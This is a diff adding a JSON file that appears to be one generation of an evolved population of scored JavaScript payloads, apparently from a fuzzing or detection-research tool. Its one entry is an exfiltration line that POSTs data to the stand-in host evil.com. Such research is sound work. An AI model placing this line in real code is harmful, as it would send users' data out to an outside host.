@@ -1,0 +1,16 @@
+{
+  "generation": 9,
+  "population": [
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x); ",
+      "fitness": 39.15,
+      "isNovel": false,
+      "impact": 44,
+      "verdict": "REVIEW",
+      "confidence": 0.03,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    }
+  ]
+}
